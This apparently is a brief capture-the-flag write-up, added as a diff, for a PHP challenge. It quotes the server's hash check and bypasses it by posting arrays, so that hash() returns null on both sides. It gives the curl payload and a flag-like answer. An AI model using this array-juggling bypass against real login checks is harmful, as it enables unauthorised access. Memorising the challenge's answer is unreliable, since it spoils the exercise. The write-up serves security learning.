@@ -1,0 +1,9 @@
+The server checks to see if our inputs are different, but have the same sha512 hash.
+
+if($_POST['username'] !== $_POST['password'] && hash('sha512', $_POST['username']) === hash('sha512', $_POST['password'])) { // The super secure strict comparison.
+
+Instead of trying to find a collision, we can force both inputs to be null by passing in arrays.
+
+$ curl "http://web.camscsc.org/7-ddxv/" --data "username[]=a&password[]=aa"
+
+{ERROR===ERROR}
